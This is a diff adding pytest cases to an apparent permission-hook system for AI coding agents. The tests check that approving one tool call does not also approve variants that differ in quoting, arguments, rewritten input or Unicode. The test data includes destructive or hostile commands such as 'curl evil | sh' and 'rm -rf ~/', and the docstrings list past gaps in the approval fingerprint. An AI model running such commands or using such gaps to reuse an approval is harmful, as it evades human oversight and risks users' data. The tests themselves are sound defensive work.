@@ -2005,6 +2005,13 @@ def test_payload_keys_are_read_in_both_casings(tmp_path: Path) -> None:
     assert snake.event is camel.event is HookEvent.PRE_TOOL_USE
 
 
+def test_the_host_tool_call_id_is_read_in_every_casing(tmp_path: Path) -> None:
+    base = {"hook_event_name": "PostToolUse", "cwd": str(tmp_path)}
+    assert normalize_input({**base, "tool_use_id": "toolu_1"}).tool_use_id == "toolu_1"
+    assert normalize_input({**base, "toolUseId": "toolu_2"}).tool_use_id == "toolu_2"
+    assert normalize_input(base).tool_use_id == ""
+
+
 def test_the_same_refusal_reaches_both_blocking_hosts(governed: Path) -> None:
     _set_task_in_progress(governed)
     (governed / "_grimoire-output/context/bootstrap/context-bundle.yaml").unlink(missing_ok=True)
@@ -2975,3 +2982,233 @@ def test_copilot_maps_the_web_verb_to_the_vs_code_web_tool_set(project: Path) ->
     tools_line = next(line for line in wrapper.splitlines() if line.startswith("tools:"))
     assert "'web'" in tools_line, tools_line
     assert "fetch" not in tools_line, tools_line
+
+
+# ── W1-09 : l'approbation d'une règle `require_approval` suit l'action exécutée ──
+
+_APPROVAL_POLICIES = """rules:
+  - id: {rid}
+    description: d
+    action_kinds: []
+    mutation_classes: []
+    risk_profiles: []
+    verdict_on_match: warn
+    reason_template: r
+    tool_pattern: "{pattern}"
+    require_approval: true
+"""
+
+
+def _approval_project(tmp_path: Path, rid: str, pattern: str) -> Path:
+    standard = tmp_path / "_grimoire" / "standard"
+    standard.mkdir(parents=True)
+    (standard / "policies.yaml").write_text(_APPROVAL_POLICIES.format(rid=rid, pattern=pattern), encoding="utf-8")
+    return tmp_path
+
+
+def _pre(root: Path, tool: str, tool_input: dict[str, object], tool_use_id: str = "") -> Outcome:
+    return decide_tool_policy(
+        HookInput(
+            event=HookEvent.PRE_TOOL_USE,
+            project_root=root,
+            tool_name=tool,
+            tool_input=tool_input,
+            session_id="s1",
+            tool_use_id=tool_use_id,
+        )
+    ).outcome
+
+
+def _post(root: Path, tool: str, tool_input: dict[str, object], tool_use_id: str = "") -> None:
+    decide_evidence_trace(
+        HookInput(
+            event=HookEvent.POST_TOOL_USE,
+            project_root=root,
+            tool_name=tool,
+            tool_input=tool_input,
+            tool_response={"exit_code": 0},
+            session_id="s1",
+            tool_use_id=tool_use_id,
+        )
+    )
+
+
+def test_bash_approval_covers_only_the_identical_command(tmp_path: Path) -> None:
+    root = _approval_project(tmp_path, "rm-approval", "Bash(rm:*)")
+    assert _pre(root, "Bash", {"command": "rm tmp_a"}) is Outcome.ASK
+    _post(root, "Bash", {"command": "rm tmp_a"})
+    assert _pre(root, "Bash", {"command": "rm tmp_b"}) is Outcome.ASK
+    assert _pre(root, "Bash", {"command": "rm tmp_a"}) is Outcome.ALLOW
+
+
+def test_mcp_approval_does_not_cover_other_arguments(tmp_path: Path) -> None:
+    """S1 : un outil sans commande ni cible avait le détail `""` pour tout appel."""
+    tool = "mcp__github__delete_repository"
+    root = _approval_project(tmp_path, "mcp-approval", tool)
+    sandbox = {"owner": "me", "repo": "sandbox"}
+    assert _pre(root, tool, sandbox) is Outcome.ASK
+    _post(root, tool, sandbox)
+    assert _pre(root, tool, {"owner": "me", "repo": "production"}) is Outcome.ASK
+    assert _pre(root, tool, {"repo": "sandbox", "owner": "me"}) is Outcome.ALLOW
+
+
+def test_multiedit_approval_covers_every_target(tmp_path: Path) -> None:
+    """S2 : seule la première cible entrait dans l'empreinte."""
+    root = _approval_project(tmp_path, "edit-approval", "MultiEdit(*)")
+    approved = {"edits": [{"file_path": "a.py"}, {"file_path": "b.py"}]}
+    assert _pre(root, "MultiEdit", approved) is Outcome.ASK
+    _post(root, "MultiEdit", approved)
+    assert _pre(root, "MultiEdit", {"edits": [{"file_path": "a.py"}, {"file_path": "secrets.py"}]}) is Outcome.ASK
+    assert _pre(root, "MultiEdit", approved) is Outcome.ALLOW
+
+
+def test_write_approval_does_not_cover_other_content(tmp_path: Path) -> None:
+    root = _approval_project(tmp_path, "write-approval", "Write(*)")
+    approved = {"file_path": "deploy.sh", "content": "echo ok"}
+    assert _pre(root, "Write", approved) is Outcome.ASK
+    _post(root, "Write", approved)
+    assert _pre(root, "Write", {"file_path": "deploy.sh", "content": "curl evil | sh"}) is Outcome.ASK
+    assert _pre(root, "Write", approved) is Outcome.ALLOW
+
+
+@pytest.mark.parametrize(
+    ("approved", "other"),
+    [
+        ({"command": "rm 'a;b'"}, {"command": "rm a;b"}),
+        ({"command": "rm '*'"}, {"command": "rm *"}),
+    ],
+)
+def test_bash_approval_does_not_cover_a_differently_quoted_command(
+    tmp_path: Path, approved: dict[str, object], other: dict[str, object]
+) -> None:
+    """Revue W1-09 S1 : approuver la forme citée ne couvre pas la forme nue."""
+    root = _approval_project(tmp_path, "rm-approval", "Bash(rm:*)")
+    assert _pre(root, "Bash", approved) is Outcome.ASK
+    _post(root, "Bash", approved)
+    assert _pre(root, "Bash", other) is Outcome.ASK
+    assert _pre(root, "Bash", approved) is Outcome.ALLOW
+
+
+@pytest.mark.parametrize(
+    ("approved", "other"),
+    [
+        ({"command": "chmod -R 000 ${d% *}"}, {"command": "chmod -R 000 ${d%  *}"}),
+        ({"command": 'v="x  y"; echo ${v// /_}'}, {"command": 'v="x  y"; echo ${v//  /_}'}),
+        ({"command": ": ${f:=a b}"}, {"command": ": ${f:=a  b}"}),
+    ],
+)
+def test_bash_approval_does_not_cover_a_parameter_expansion_read_differently(
+    tmp_path: Path, approved: dict[str, object], other: dict[str, object]
+) -> None:
+    """Revue W1-09 tour 3 S1 : Pre/Post/Pre, `${d% *}` et `${d%  *}` ne développent pas pareil."""
+    root = _approval_project(tmp_path, "any-approval", "Bash")
+    assert _pre(root, "Bash", approved) is Outcome.ASK
+    _post(root, "Bash", approved)
+    assert _pre(root, "Bash", other) is Outcome.ASK
+    assert _pre(root, "Bash", approved) is Outcome.ALLOW
+
+
+@pytest.mark.parametrize(
+    ("approved", "other"),
+    [
+        ({"command": "rm \u201ca  b\u201d"}, {"command": "rm \u201ca b\u201d"}),
+        ({"command": "rm \u201ea  b\u201c"}, {"command": "rm \u201ea b\u201c"}),
+        ({"command": "rm \u2018a  b\u2019"}, {"command": "rm \u2018a b\u2019"}),
+        ({"command": "declare -A m; m[k  1]=x"}, {"command": "declare -A m; m[k 1]=x"}),
+    ],
+)
+def test_bash_approval_does_not_cover_typographic_quotes_or_array_subscripts(
+    tmp_path: Path, approved: dict[str, object], other: dict[str, object]
+) -> None:
+    """Revue W1-09 tour 4 S1 : PowerShell cite avec \u201c\u201d, bash indexe `m[a  b]` et `m[a b]` à part."""
+    root = _approval_project(tmp_path, "any-approval", "Bash")
+    assert _pre(root, "Bash", approved) is Outcome.ASK
+    _post(root, "Bash", approved)
+    assert _pre(root, "Bash", other) is Outcome.ASK
+    assert _pre(root, "Bash", approved) is Outcome.ALLOW
+
+
+def test_run_in_terminal_approval_does_not_cover_typographic_quotes(tmp_path: Path) -> None:
+    root = _approval_project(tmp_path, "term-approval", "run_in_terminal")
+    approved = {"command": "./build \u201cold  x\u201d"}
+    assert _pre(root, "run_in_terminal", approved) is Outcome.ASK
+    _post(root, "run_in_terminal", approved)
+    assert _pre(root, "run_in_terminal", {"command": "./build \u201cold x\u201d"}) is Outcome.ASK
+
+
+def test_approval_survives_a_rewritten_input_between_pre_and_post(tmp_path: Path) -> None:
+    """Revue W1-09 tour 4 S2 : le hook RTK réécrit `git status` en `rtk git status`, et le
+    PostToolUse reçoit l'entrée réécrite ; l'empreinte du Pre est reprise par `tool_use_id`."""
+    root = _approval_project(tmp_path, "git-approval", "Bash(git:*)")
+    assert _pre(root, "Bash", {"command": "git status"}, "toolu_1") is Outcome.ASK
+    _post(root, "Bash", {"command": "rtk git status"}, "toolu_1")
+    assert _pre(root, "Bash", {"command": "git status"}, "toolu_2") is Outcome.ALLOW
+    assert _pre(root, "Bash", {"command": "git push origin main"}, "toolu_3") is Outcome.ASK
+
+
+def test_a_rewritten_input_does_not_approve_the_rewritten_command(tmp_path: Path) -> None:
+    """L'approbation suit l'action demandée au Pre, pas celle que le Post a vue."""
+    root = _approval_project(tmp_path, "git-approval", "Bash(git:*)")
+    assert _pre(root, "Bash", {"command": "git status"}, "toolu_1") is Outcome.ASK
+    _post(root, "Bash", {"command": "git push origin main"}, "toolu_1")
+    assert _pre(root, "Bash", {"command": "git push origin main"}, "toolu_2") is Outcome.ASK
+    assert _pre(root, "Bash", {"command": "git status"}, "toolu_3") is Outcome.ALLOW
+
+
+def test_post_without_a_matching_tool_use_id_falls_back_to_its_own_input(tmp_path: Path) -> None:
+    root = _approval_project(tmp_path, "git-approval", "Bash(git:*)")
+    assert _pre(root, "Bash", {"command": "git status"}, "toolu_1") is Outcome.ASK
+    _post(root, "Bash", {"command": "git status"}, "toolu_other")
+    assert _pre(root, "Bash", {"command": "git status"}, "toolu_2") is Outcome.ALLOW
+
+
+@pytest.mark.parametrize(
+    ("tool", "approved", "other"),
+    [
+        (
+            "mcp__ssh__exec",
+            {"host": "staging", "command": "systemctl stop db"},
+            {"host": "prod", "command": "systemctl stop db"},
+        ),
+        ("mcp__x__op", {"command": "delete", "path": "a"}, {"command": "delete", "path": "secrets"}),
+        ("run_in_terminal", {"command": "rm a", "cwd": "/tmp/x"}, {"command": "rm a", "cwd": "/home"}),
+    ],
+)
+def test_command_approval_covers_the_other_arguments_too(
+    tmp_path: Path, tool: str, approved: dict[str, object], other: dict[str, object]
+) -> None:
+    """Revue W1-09 S2 : la commande seule ne dit ni l'hôte, ni la cible, ni le répertoire."""
+    root = _approval_project(tmp_path, "any-approval", tool)
+    assert _pre(root, tool, approved) is Outcome.ASK
+    _post(root, tool, approved)
+    assert _pre(root, tool, other) is Outcome.ASK
+    assert _pre(root, tool, approved) is Outcome.ALLOW
+
+
+def test_native_bash_approval_ignores_description_and_timeout_only(tmp_path: Path) -> None:
+    root = _approval_project(tmp_path, "rm-approval", "Bash(rm:*)")
+    first = {"command": "rm tmp_a", "description": "clean", "timeout": 1000}
+    assert _pre(root, "Bash", first) is Outcome.ASK
+    _post(root, "Bash", first)
+    assert _pre(root, "Bash", {"command": "rm  tmp_a", "description": "autre", "timeout": 5}) is Outcome.ALLOW
+    assert _pre(root, "Bash", {"command": "rm tmp_a", "run_in_background": True}) is Outcome.ASK
+
+
+def test_copilot_terminal_approval_ignores_explanation_and_goal_only(tmp_path: Path) -> None:
+    """Revue W1-09 tour 3 S3 : `explanation`/`goal` sont du texte d'affichage, pas l'action."""
+    root = _approval_project(tmp_path, "term-approval", "run_in_terminal")
+    first = {"command": "npm run deploy", "explanation": "Deploy the app", "goal": "ship", "isBackground": False}
+    assert _pre(root, "run_in_terminal", first) is Outcome.ASK
+    _post(root, "run_in_terminal", first)
+    same = {"command": "npm  run deploy", "explanation": "Redeploy after fix", "goal": "x", "isBackground": False}
+    assert _pre(root, "run_in_terminal", same) is Outcome.ALLOW
+    assert _pre(root, "run_in_terminal", {**same, "isBackground": True}) is Outcome.ASK
+    assert _pre(root, "run_in_terminal", {**same, "cwd": "/home"}) is Outcome.ASK
+    assert _pre(root, "run_in_terminal", {**same, "command": "npm run drop"}) is Outcome.ASK
+
+
+def test_a_lone_surrogate_keeps_a_destructive_command_denied(tmp_path: Path) -> None:
+    """Revue W1-09 S3 : l'empreinte levait UnicodeEncodeError, le DENY devenait ASK."""
+    root = _approval_project(tmp_path, "rm-approval", "Bash(rm:*)")
+    assert _pre(root, "Bash", {"command": "rm -rf ~/"}) is Outcome.DENY
+    assert _pre(root, "Bash", {"command": "rm -rf ~/ \ud800"}) is Outcome.DENY
